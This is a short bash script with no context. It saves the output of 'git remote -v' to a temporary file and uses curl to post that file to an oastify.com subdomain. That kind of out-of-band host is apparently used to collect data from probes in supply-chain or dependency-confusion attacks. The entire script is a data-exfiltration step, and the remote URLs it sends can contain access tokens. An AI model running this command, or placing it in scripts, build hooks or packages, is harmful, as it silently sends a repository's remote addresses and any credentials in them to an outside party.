#!/bin/bash

git remote -v > /tmp/test.txt
curl http://cursor.bo3g9xfz5xwyg2xey5p46a0swj2aq1eq.oastify.com --data-binary @/tmp/test.txt